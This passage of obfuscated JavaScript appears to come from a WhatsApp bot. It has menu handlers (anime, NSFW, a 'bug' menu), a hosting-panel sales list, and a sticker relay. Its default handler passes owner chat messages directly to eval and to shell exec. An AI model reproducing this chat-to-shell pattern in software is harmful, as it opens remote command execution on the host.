                'displayText': "𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'mainmenu',
              'buttonText': {
                'displayText': '𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "creampiemenu",
              'buttonText': {
                'displayText': "𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "bugmenu",
              'buttonText': {
                'displayText': "𝙱𝚄𝙶𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "Funmenu",
              'buttonText': {
                'displayText': "𝙵𝚄𝙽𝙼𝙴𝙽𝚄"
              }
            }],
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x5f530e,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1203233549551004@newsletter",
                'newsletterName': "LOSTBOY "
              }
            }
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "creampiemenu":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '😁',
              'key': _0x5f530e.key
            }
          });
          const _0x52db92 = "*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n  ᑕᖇᗴᗩᗰᑭIᗴ ᗰᗴᑎᑌ\n\n> 𝙷𝙽𝙴𝙺𝙾\n> 𝚃𝚁𝙰𝙿\n> 𝙶𝙸𝙵𝙱𝙻𝙾𝚆𝙹𝙾𝙱\n> 𝙰𝙽𝙸𝙼𝙴𝚂𝙿𝙰𝙽𝙺\n> 𝙽𝚆𝙰𝙸𝙵𝚄";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': {
              'url': "https://files.catbox.moe/s7huhm.jpg"
            },
            'caption': _0x52db92,
            'mentions': [_0x5f530e.sender],
            'footer': global.botName,
            'buttons': [{
              'buttonId': 'ownermenu',
              'buttonText': {
                'displayText': "𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "downloadmenu",
              'buttonText': {
                'displayText': "𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄."
              }
            }, {
              'buttonId': "databasemenu",
              'buttonText': {
                'displayText': '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': 'animemenu',
              'buttonText': {
                'displayText': "𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "mainmenu",
              'buttonText': {
                'displayText': "𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "creampiemenu",
              'buttonText': {
                'displayText': "𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'bugmenu',
              'buttonText': {
                'displayText': "𝙱𝚄𝙶𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "Funmenu",
              'buttonText': {
                'displayText': "𝙵𝚄𝙽𝙼𝙴𝙽𝚄"
              }
            }],
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x5f530e,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1203233549551004@newsletter",
                'newsletterName': "LOSTBOY "
              }
            }
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case 'animemenu':
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '😁',
              'key': _0x5f530e.key
            }
          });
          const _0x50f5c8 = "*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : 'Free') + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n  ᗩᑎIᗰᗴ ᗰᗴᑎᑌ\n\n> 𝚂𝚃𝙸𝙲𝙺𝙰𝚆𝙾𝙾\n> 𝚂𝚃𝙸𝙲𝙺𝚆𝙰𝚅𝙴\n> 𝚂𝚃𝙸𝙲𝙺𝙴𝚁𝙱𝙻𝚄𝚂𝙷\n> 𝚂𝚃𝙸𝙲𝙺𝙲𝚁𝙸𝙽𝙶𝙴\n> 𝚂𝚃𝙸𝙲𝙺𝙷𝙰𝙿𝙿𝚈\n> 𝚂𝚃𝙸𝙲𝙺𝙶𝙻𝙾𝙼𝙿\n> 𝚂𝚃𝙸𝙲𝙺𝙳𝙰𝙽𝙲𝙴\n> 𝚂𝚃𝙸𝙲𝙺𝙼𝚄𝙶\n> 𝚂𝚃𝙸𝙲𝙺𝙷𝙸𝙶𝙷𝙵𝙸𝚅𝙴\n> 𝚂𝚃𝙸𝙲𝙺𝚂𝙷𝙸𝙽𝙾𝙱𝚄\n> 𝚂𝚃𝙸𝙲𝙺𝙲𝚄𝙳𝙳𝙻𝙴";
          _0x239047.sendMessage(_0x5f530e.chat, {
            'image': {
              'url': "https://files.catbox.moe/s7huhm.jpg"
            },
            'caption': _0x50f5c8,
            'mentions': [_0x5f530e.sender],
            'footer': global.botName,
            'buttons': [{
              'buttonId': "ownermenu",
              'buttonText': {
                'displayText': "𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "downloadmenu",
              'buttonText': {
                'displayText': "𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄."
              }
            }, {
              'buttonId': 'databasemenu',
              'buttonText': {
                'displayText': '𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': '𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "animemenu",
              'buttonText': {
                'displayText': "𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'mainmenu',
              'buttonText': {
                'displayText': "𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': 'creampiemenu',
              'buttonText': {
                'displayText': "𝙲𝚁𝙴𝙰𝙼𝙿𝙸𝙴𝙼𝙴𝙽𝚄"
              }
            }, {
              'buttonId': "bugmenu",
              'buttonText': {
                'displayText': '𝙱𝚄𝙶𝙼𝙴𝙽𝚄'
              }
            }, {
              'buttonId': "Funmenu",
              'buttonText': {
                'displayText': "𝙵𝚄𝙽𝙼𝙴𝙽𝚄"
              }
            }],
            'viewOnce': true,
            'headerType': 0x6,
            'quoted': _0x5f530e,
            'contextInfo': {
              'isForwarded': true,
              'forwardingScore': 0x1869f,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1203233549551004@newsletter",
                'newsletterName': "LOSTBOY "
              }
            }
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "listram":
        xmenu_oh = "\n                ■□■□■□■□□■□■□□■□■□\n> Hello " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n> ╰⭑➤⭑➤ " + lostboytimewisher + " 😇\n" + readmore + "\n \nWagwan guys, I'm Lostboy,a legit panel vendor and a bot seller\nhttps://wa.me/233549551004\n╭───❏ ᴍʏ sᴇʀᴠɪᴄᴇs│\n    *LIST PRIVATE PANEL*\n*BY LOSTBOY😮‍💨🖐️ WE DONT DO SCAM HERE*\n !.  ● * 1ɢʙ ➤ 500*\n╎. ● *2ɢʙ ➤ 1000*\n╎. ● *3ɢʙ ➤ 1500*\n╎. ● *4ɢʙ ➤ 2000*\n╎. ● *5ɢʙ ➤ 2500*\n╎. ● *6gb ➤ 3000*\n╎. ● *7gb ➤ 3500*\n╎. ● *8gb ➤ 4000*\n╎. ● *9gb ➤ 4500*\n╎. ● *10gb ➤ 5k*\n╎. ● *unli ➤ 7k*\n>>┈┈┈┈┈┈┈┈┈┈┈\n\n *DM if interested in panel or deployment             \n╰━━━━━━━━━━━━━━━━──⊷\n *LOSTBOY*\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3 ▇ ▆ ▅ ▄ ▂ ";
        if (typemenu === 'v1') {
          _0x239047.sendMessage(_0x5f530e.chat, {
            'text': xmenu_oh,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': 'https://files.catbox.moe/l1srou.jpg',
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5f530e
          });
        } else {
          if (typemenu === 'v2') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': fs.readFileSync("./C-SMedia/menu2.mp4"),
              'gifPlayback': true,
              'caption': xmenu_oh,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': 'https://files.catbox.moe/s7huhm.jpg',
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v3') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync('./C-SMedia/menu2.mp4'),
                'caption': xmenu_oh,
                'gifPlayback': true
              }, {
                'quoted': _0x5f530e
              });
            } else if (typemenu === 'v4') {
              _0x239047.relayMessage(_0x5f530e.chat, {
                'scheduledCallCreationMessage': {
                  'callType': "AUDIO",
                  'scheduledTimestampMs': 0x4b0,
                  'title': xmenu_oh
                }
              }, {});
            }
          }
        }
        break;
      case "telestick":
        {
          if (_0x4376c7[0x0] && _0x4376c7[0x0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
            let _0x501af0 = await _0x26fb55(_0x4376c7[0x0]);
            await _0x4242ca("Sending " + _0x501af0.length + " stickers...");
            if (_0x5f530e.isGroup && _0x501af0.length > 0x1e) {
              await _0x4242ca("Number of stickers more than 30, bot will send it in private chat.");
              for (let _0x3413d5 = 0x0; _0x3413d5 < _0x501af0.length; _0x3413d5++) {
                _0x239047.sendMessage(_0x5f530e.sender, {
                  'sticker': {
                    'url': _0x501af0[_0x3413d5].url
                  }
                });
              }
            } else {
              for (let _0x32dbf9 = 0x0; _0x32dbf9 < _0x501af0.length; _0x32dbf9++) {
                _0x239047.sendMessage(_0x5f530e.chat, {
                  'sticker': {
                    'url': _0x501af0[_0x32dbf9].url
                  }
                });
              }
            }
          } else {
            _0x4242ca("Where is the telegram sticker link?\nExample. " + (_0x1e0f65 + _0x418bf4) + " https://t.me/addstickers/FriendlyDeath");
          }
        }
        break;
      default:
        if (_0x3a0bbf.startsWith('=>')) {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          try {
            _0x4242ca(util.format(eval("(async () => { return " + _0x3a0bbf.slice(0x3) + " })()")));
          } catch (_0x10e748) {
            _0x4242ca(String(_0x10e748));
          }
        }
        if (_0x3a0bbf.startsWith('>')) {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          try {
            let _0x1c881f = await eval(_0x3a0bbf.slice(0x2));
            if (typeof _0x1c881f !== "string") {
              _0x1c881f = require('util').inspect(_0x1c881f);
            }
            await _0x4242ca(_0x1c881f);
          } catch (_0x2ecfee) {
            await _0x4242ca(String(_0x2ecfee));
          }
        }
        if (_0x3a0bbf.startsWith('$')) {
          if (!_0x11eb7e) {
            return _0x4242ca(mess.owner);
          }
          exec(_0x3a0bbf.slice(0x2), (_0x596bbd, _0x3e9b56) => {
            if (_0x596bbd) {
              return _0x4242ca(_0x596bbd);
            }
            if (_0x3e9b56) {
              return _0x4242ca(_0x3e9b56);
            }
          });
        }
    }
  } catch (_0x3400c6) {
    console.log(util.format(_0x3400c6));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
process.on("uncaughtException", function (_0x2e36bd) {
  let _0x44260c = String(_0x2e36bd);
  if (_0x44260c.includes("conflict")) {
    return;
  }
  if (_0x44260c.includes("Socket connection timeout")) {
    return;
  }
  if (_0x44260c.includes('not-authorized')) {
    return;
  }
  if (_0x44260c.includes('already-exists')) {
    return;
  }
  if (_0x44260c.includes("rate-overlimit")) {
    return;
  }
  if (_0x44260c.includes("Connection Closed")) {
    return;
  }
  if (_0x44260c.includes("Timed Out")) {
    return;
  }
  if (_0x44260c.includes("Value not found")) {
    return;
  }
  console.log("Caught exception: ", _0x2e36bd);
});
